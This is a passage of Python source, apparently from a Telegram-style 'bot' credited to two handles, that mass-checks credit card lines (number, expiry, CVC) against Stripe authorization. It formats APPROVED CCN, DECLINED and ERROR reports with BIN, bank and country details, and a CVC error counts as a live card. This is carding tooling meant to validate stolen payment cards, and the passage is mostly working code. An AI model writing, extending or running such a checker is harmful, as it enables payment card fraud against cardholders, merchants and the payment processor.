🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    # Check for specific error messages that should be treated as APPROVED
                    error_data = website_response.get('data', {})
                    if 'error' in error_data:
                        error_msg = error_data['error'].get('message', '').lower()
                        
                        # Treat these errors as APPROVED
                        if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
                            return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    
            else:
                if retry_count < max_retries - 1:
                    print(f"Stripe validation failed, retry {retry_count + 1}/{max_retries}")
                    time.sleep(2)
                    continue
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe validation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        except Exception as e:
            if retry_count < max_retries - 1:
                print(f"Request failed with error: {str(e)}, retry {retry_count + 1}/{max_retries}")
                time.sleep(2)
                continue
            elapsed_time = time.time() - start_time
            # Get BIN info even for errors to ensure we have it
            bin_info = get_bin_info_reliable(cc_line.split('|')[0][:6]) if '|' in cc_line else get_fallback_bin_info('')
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_stripe(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_stripe(cc_line)
        results.append(result)
        time.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Test with a single card
    test_cc = "4111111111111111|12|2025|123"
    print("Testing Stripe checker...")
    result = check_card_stripe(test_cc)
    print(result)
